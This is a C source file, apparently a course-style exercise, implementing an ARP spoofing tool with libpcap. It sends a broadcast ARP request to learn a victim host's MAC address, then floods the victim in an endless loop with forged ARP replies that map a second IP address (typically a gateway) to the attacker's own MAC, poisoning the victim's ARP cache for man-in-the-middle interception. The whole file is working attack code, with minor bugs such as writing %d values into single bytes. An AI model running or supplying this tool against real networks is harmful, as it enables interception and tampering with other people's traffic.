#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include "arp_header.h"

void convert_ip(unsigned char *real, char *fake){
    sscanf(fake,"%d.%d.%d.%d",&real[0],&real[1],&real[2],&real[3]);
}
int main(int argc, char *argv[])
{
    unsigned char myMac[6];
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    unsigned char sender_ip[4], target_ip[4];
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct ETH *eth = (struct ETH *)malloc(42);
    unsigned char *packet = (unsigned char *)malloc(42);

    strcpy(s.ifr_name, argv[1]);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        memcpy(myMac, s.ifr_addr.sa_data,6);
    }

    convert_ip(target_ip,argv[3]);
    convert_ip(sender_ip,argv[2]);

    fp = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
    if(fp == NULL){
        fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
        return -1;
    }

    memcpy(eth->D_Mac,"\xff\xff\xff\xff\xff\xff",6);
    memcpy(eth->S_Mac,myMac,6);
    memcpy(eth->EType,"\x08\x06",2);
    memcpy(eth->hardwareType,"\x00\x01",2);
    memcpy(eth->protocolType,"\x08\x00",2);
    eth->hardwareSize = 0x06;
    eth->protocolSize = 0x04;
    memcpy(eth->opCode,"\x00\x01",2); //request
    memcpy(eth->senderMac,myMac,6);
    memcpy(eth->senderIp,"\x00\x00\x00\x00",4);
    memcpy(eth->targetMac,"\x00\x00\x00\x00\x00\x00",6);
    memcpy(eth->targetIp,sender_ip,4);


    memcpy(packet,eth,42);
    if(pcap_sendpacket(fp,packet,42))
        fprintf(stderr, "\t[!] failed to send packet: %s\n", pcap_geterr(fp));

    const u_char* packet2;
    while (true) {
      struct pcap_pkthdr* header;
      int res = pcap_next_ex(fp, &header, &packet2);
      if (res == 0) continue;
      if (res == -1 || res == -2) break;
      printf("%u bytes captured\n", header->caplen);
      if(packet2[0xc] == 0x08 && packet2[0xd] == 0x06 && packet2[0x14] == 0x00 && packet2[0x15] == 0x02){
          if(!memcmp(&packet2[0x1c],sender_ip,4))
            break;
      }
    }
    unsigned char *sender_mac = (unsigned char *) malloc(6);

    memcpy(sender_mac,&packet2[0x6],6);

    printf("MAC : ");
    for(int i=0; i<6;i++){
        printf("0x%x ",sender_mac[i]);
    }
    puts("");

    memcpy(eth->D_Mac,sender_mac,6);
    memcpy(eth->S_Mac,myMac,6);
    memcpy(eth->EType,"\x08\x06",2);
    memcpy(eth->hardwareType,"\x00\x01",2);
    memcpy(eth->protocolType,"\x08\x00",2);
    eth->hardwareSize = 0x06;
    eth->protocolSize = 0x04;
    memcpy(eth->opCode,"\x00\x02",2); //reply
    memcpy(eth->senderMac,myMac,6);
    memcpy(eth->senderIp,target_ip,4);
    memcpy(eth->targetMac,sender_mac,6);
    memcpy(eth->targetIp,sender_ip,4);

    unsigned char *haha = (unsigned char *)malloc(42);
    memcpy(haha,eth,42);

    while(true){
    if(pcap_sendpacket(fp,haha,42))
        fprintf(stderr, "\t[!] failed to send packet: %s\n", pcap_geterr(fp));
    }
}
